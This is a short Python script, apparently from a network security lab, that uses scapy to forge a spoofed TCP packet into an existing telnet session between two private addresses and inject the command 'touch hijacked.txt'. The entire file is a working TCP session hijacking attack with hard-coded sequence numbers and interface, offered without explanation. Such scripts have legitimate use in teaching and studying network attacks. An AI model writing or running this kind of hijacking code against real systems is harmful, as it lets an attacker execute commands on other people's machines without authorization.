#!/usr/bin/env python3

from scapy.all import IP, TCP, send

ip = IP(src="10.9.0.6", dst="10.9.0.5")

tcp = TCP(
    sport=50406,
    dport=23,
    flags="A",
    seq=2585968603,
    ack=1554597647
)

data = "touch hijacked.txt\r\n"

packet = ip / tcp / data

send(packet, iface="br-f3ff260bf491", verbose=0)
